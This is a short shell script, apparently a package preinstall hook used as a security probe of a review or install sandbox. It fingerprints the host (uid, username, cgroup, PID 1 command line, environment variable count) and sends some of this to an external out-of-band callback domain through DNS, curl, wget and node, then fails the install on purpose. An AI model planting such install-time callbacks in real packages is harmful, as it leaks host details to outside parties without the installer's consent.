#!/bin/sh
# H81 preinstall probe. Fingerprint + out-of-band callback only; no environment
# variable values are read, printed or transmitted. Then fail the install so the
# review's install/tool-failure surface can be compared with the ESLint cell.
M="H81-PREINSTALL"
P="dc1hd9o7gbcc8395tg804i5nqjbgmogci.oast.me"
U=$(id -u 2>/dev/null)
N=$(id -un 2>/dev/null)
CG=$(head -c 220 /proc/self/cgroup 2>/dev/null | tr '\n' ';')
P1=$(head -c 160 /proc/1/cmdline 2>/dev/null | tr '\0' ' ')
EN=$(env 2>/dev/null | wc -l)

echo "$M uid=$U($N) cg=$CG pid1=$P1 envn=$EN"

# DNS resolution probe (fires even when HTTP egress is filtered).
getent hosts "$P" >/dev/null 2>&1 || true

# HTTP probe through whichever client exists in the install cell.
curl -sS -m 10 "http://$P/h81-preinstall?m=$M&u=$U&e=$EN" >/dev/null 2>&1 || true
wget -q -T 10 -O /dev/null "http://$P/h81-preinstall-wget?m=$M&u=$U&e=$EN" >/dev/null 2>&1 || true
node -e 'try{var http=require("http");var p=process.argv[1];http.get("http://"+p+"/h81-preinstall-node?m=H81-PREINSTALL",function(r){r.resume();r.on("end",function(){process.exit(0)})}).on("error",function(){process.exit(0)});setTimeout(function(){process.exit(0)},9000)}catch(e){process.exit(0)}' "$P" >/dev/null 2>&1 || true

# Fail the dependency install so the review reports the install/tool outcome.
exit 1
